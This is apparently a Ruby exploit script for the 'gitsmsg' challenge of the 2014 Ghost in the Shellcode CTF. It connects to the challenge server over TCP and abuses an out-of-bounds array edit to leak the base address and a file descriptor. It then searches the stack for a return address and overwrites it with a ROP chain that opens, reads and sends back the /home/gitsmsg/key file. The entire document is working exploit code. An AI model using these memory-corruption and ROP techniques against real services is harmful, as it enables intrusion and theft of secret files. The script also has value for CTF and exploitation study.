require 'socket'
require 'timeout'

MESSAGE_LOGIN        = 0x01
MESSAGE_DELETE       = 0x02
MESSAGE_STORE        = 0x04
MESSAGE_GET          = 0x05
MESSAGE_SEND_QUEUED  = 0x07
MESSAGE_EDIT         = 0x08
MESSAGE_QUIT         = 0x09

VARDATA_TYPE_BYTE         = 0x10
VARDATA_TYPE_INT          = 0x11
VARDATA_TYPE_DOUBLE       = 0x12
VARDATA_TYPE_BYTE_ARRAY   = 0x13
VARDATA_TYPE_INT_ARRAY    = 0x14
VARDATA_TYPE_DOUBLE_ARRAY = 0x15
VARDATA_TYPE_STRING       = 0x16

# 10 A's, followed by a null (so it doesn't wind up too long), then pad
# the rest of the way to 0x100 bytes (the required length)
DEFAULT_FROM_USERNAME = ("A" * 10) + "\0" + "A" * (0x100 - 11)
DEFAULT_TO_USERNAME   = ("B" * 10) + "\0" + "B" * (0x100 - 11)
KEY_PATH              = "/home/gitsmsg/key"

STACK_MIN = 0xBF800000
STACK_MAX = 0xBFFFFFFF

# This is where the main loop function returns, and therefore what I
# want to edit on the stack
MAIN_RETURN_ADDRESS = 0x0e74

# Pop pop pop ret
PPPR = 0x00002755

# Pop pop ret
PPR  = 0x00002756

# Pop ret
PR    = 0x00002757
OPEN  = 0x00000c90
READ  = 0x00000b60
WRITE = 0x00000ce0

def get_int(s, context = "?")
  int = s.recv(4)

  if(int.nil? || int.length != 4)
    puts("Receive failed :: #{context}");
    exit
  end

  return int.unpack("I").pop
end

def receive_code(s, expected, context)
  code = get_int(s, context)

  if(code != expected)
    puts("Error! Unexpected response: 0x%08x :: %s" % [code, context])
    exit
  end
end

def login(s, username = DEFAULT_FROM_USERNAME)
  out = [MESSAGE_LOGIN, username].pack("Ia*")
  s.write(out)
  receive_code(s, 0x00001001, "login")
end

# Sends a 0x04 message (store)
def store(s, vardata_type, vardata, to_username = DEFAULT_TO_USERNAME)
  out = [MESSAGE_STORE, to_username].pack("Ia*")

  if(vardata_type == VARDATA_TYPE_BYTE)
    out += [1, vardata_type, vardata].pack("IIC")
  elsif(vardata_type == VARDATA_TYPE_INT)
    out += [4, vardata_type, vardata].pack("III")
  elsif(vardata_type == VARDATA_TYPE_DOUBLE)
    out += [8, vardata_type, vardata].pack("IIQ")
  elsif(vardata_type == VARDATA_TYPE_BYTE_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("C*")
  elsif(vardata_type == VARDATA_TYPE_INT_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("I*")
  elsif(vardata_type == VARDATA_TYPE_DOUBLE_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("Q*")
  elsif(vardata_type == VARDATA_TYPE_STRING)
    out += [1, vardata_type, vardata].pack("III")
  else
    puts("wat")
    exit
  end

  s.write(out)
  receive_code(s, 0x00001004, "store")
end

def edit_array(s, id, index, new_data)
  out = [MESSAGE_EDIT, id, index, new_data].pack("IIIa*")
  s.write(out)

  receive_code(s, 0x00001004, "edit")
end

def get(s, id)
  out = [MESSAGE_GET, id].pack("II")
  s.write(out)

  # Type (don't care)
  get_int(s)

  # Length
  len = get_int(s)

  #puts("Retrieving #{len} bytes")
  data = s.recv(len)

  # It should end with this code
  receive_code(s, 0x00001004, "get")

  return data

end

def delete(s, id)
  out = [MESSAGE_DELETE, id].pack("II")
  s.write(out)
  receive_code(s, 0x00001004, "delete")
end

def quit(s)
  s.write([MESSAGE_QUIT].pack("I"))
  receive_code(s, 0x00001003, "quit")
end

def read_dword(s, addr)

end

def hide_data(s, data)
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
  store(s, VARDATA_TYPE_BYTE_ARRAY, data.bytes.to_a)

  result = get(s, 1)[24..27].unpack("I").pop

  puts("'%s' stored at 0x%08x" % [data, result])

  return result
end


def find_return_address(s, base_addr)
  address_to_find = [base_addr + MAIN_RETURN_ADDRESS].pack("I")

  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
  store(s, VARDATA_TYPE_INT_ARRAY, [0x41414141] * 0xf0)

  puts("Reading the stack (0x%08x - 0x%08x)..." % [STACK_MIN, STACK_MAX])
  edit_array(s, 1, 3, [STACK_MIN, (STACK_MAX - STACK_MIN) / 4].pack("II"))

  # We have to re-implement "get" here, so we can handle a large buffer and
  # quit when we find what we need
  out = [MESSAGE_GET, 0].pack("II")
  s.write(out)
  get_int(s) # type (don't care)
  len = get_int(s)
  result = ""

  # Loop and read
  while(result.length < len)
    result = result + s.recv(STACK_MAX - STACK_MIN + 1)

    # As soon as we find the location, end
    if(loc = result.index(address_to_find))
      return STACK_MIN + loc
    end
  end

  # D'awww :(
  puts("Couldn't find the return address :(")
  exit
end

def get_rop(file_path, base_addr, fd)
    stack = [
      base_addr + OPEN,  # open()
      base_addr + PPR,   # pop/pop/ret
      file_path,         # filename = value we created
      0,                 # flags

      base_addr + READ,  # read()
      base_addr + PPPR,  # pop/pop/pop/ret
      0,                 # fd
      file_path,         # buf
      100,               # count

      base_addr + WRITE, # write()
      base_addr + PPPR,  # pop/pop/pop/ret
      fd,                # fd
      file_path,         # buf
      100,               # count

      # This was simply for testing, it sends 4 bytes then exits
      base_addr + 0x2350
    ]

    return stack
end

def change_return_address(s, return_address, stack)

    puts("Attempting to ROP-read the key file...")

    0.upto(stack.size - 1) do |i|
      entry = [stack[i]].pack("I")
      edit_array(s, 1, 3, [return_address - (i * 4), 1].pack("II"))
      edit_array(s, 1, 3, [return_address + (i * 4), 1].pack("II"))
      edit_array(s, 0, 0, entry)
    end
end

def get_base_address(s)
  # Leak the address of an impotant variable
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x4444444444444444]*4)
  store(s, VARDATA_TYPE_STRING, 0)
  addr = get(s, 1)[0x18..0x1b].unpack("I").pop
  addr = addr - 0x2bb0

  return addr
end

def get_fd(s, base)
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
  store(s, VARDATA_TYPE_INT_ARRAY, [0x41414141] * 0xf0)

  edit_array(s, 1, 3, [base+0x5164, 1].pack("II"))
  return get(s, 0).unpack("I").pop
end

#s = TCPSocket.new("localhost", 8585)
s = TCPSocket.new("gitsmsg.2014.ghostintheshellcode.com", 8585)

puts("** Initializing")
receive_code(s, 0x00001000, "init")

puts("** Logging in")
login(s)

# We add a bunch of NULL bytes to the path to clear the buffer,
# which makes it prettier to display later
puts("** Stashing a path to the file on the heap")
file_path = hide_data(s, KEY_PATH + ("\0" * 100))

puts("** Using a memory leak to get the base address")
base_addr = get_base_address(s)
puts("... found it @ 0x%08x!" % base_addr)

puts("** Reading the file descriptor from memory")
fd = get_fd(s, base_addr)
puts("... it's #{fd}!")

puts("** Searching stack memory for the return address")
return_address = find_return_address(s, base_addr)
puts("... found it @ 0x%08x" % return_address)

puts("** Generating the ROP chain")
stack = get_rop(file_path, base_addr, fd)

puts("** Changing the return address")
change_return_address(s, return_address, stack)

puts("** Sending a 'quit' message, to trigger the payload")
quit(s)

puts("** Crossing our fingers and waiting for the password")
  a = s.recv(100)
  if(a.nil? || a == "")
    exit
  end
  puts(a)
